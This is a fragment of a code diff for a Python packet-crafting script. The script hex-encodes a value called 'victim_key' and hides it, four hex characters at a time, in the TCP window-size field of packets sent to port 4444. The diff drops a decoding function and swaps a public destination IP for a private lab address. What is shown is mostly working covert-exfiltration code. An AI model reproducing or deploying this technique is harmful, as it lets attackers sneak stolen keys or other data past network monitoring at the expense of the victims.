@@ -20,11 +20,6 @@ def ser_data(data):
     return victim_key.encode("utf-8").hex()
 
 
-def deser_data(data):
-    bytes_obj = bytes.fromhex(data)
-    return bytes_obj.decode("ASCII")
-
-
 def chunk(data):
     chunk_len = 4
     return [data[i : i + chunk_len] for i in range(0, len(data), chunk_len)]
@@ -49,7 +44,7 @@ if __name__ == "__main__":
     packets = []
     for chunk in chunks:
         window_size = int(chunk, 16)
-        p = IP(dst="162.243.79.201") / TCP(dport=4444, window=window_size)
+        p = IP(dst="192.168.142.128") / TCP(dport=4444, window=window_size)
         packets.append(p)
 
     for p in packets:
